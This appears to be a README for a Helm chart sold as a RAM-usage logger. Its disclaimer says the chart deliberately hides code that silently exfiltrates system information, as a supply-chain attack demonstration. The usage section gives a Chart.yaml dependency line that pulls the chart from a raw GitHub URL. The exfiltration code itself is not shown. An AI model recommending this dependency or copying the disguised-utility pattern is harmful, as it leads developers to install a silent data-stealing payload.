**⚠️ DISCLAIMER:**  
This repository and associated scripts are **strictly for research and educational purposes only**.  
It includes intentionally vulnerable code demonstrating how sensitive information could be exfiltrated from within a seemingly benign utility that developers might download and use from GitHub repositories.  
**DO NOT** use or execute this code in any production or real-world environment.
The exfiltration attempt fails silently, ensuring the end user remains unaware of malicious activity, strictly for demonstrating potential vulnerabilities.
This repository is strictly for educational and research purposes only. It demonstrates how sensitive system information might be exfiltrated silently. **Do not run or deploy in a production environment.**

# Helm Chart RAM Logger

This Helm Chart prints the current RAM usage to log every 15 seconds.

## Usage

### Importing the Script

To use this script in your Helm Chart, add it directly to your Chart.yaml file as a dependency.

```dependencies:
  - name: ram-logger
    repository: https://raw.githubusercontent.com/MosesOX/ram-logger/main/
    version: "*"
```

---

This script helps you monitor memory consumption in an easy way!
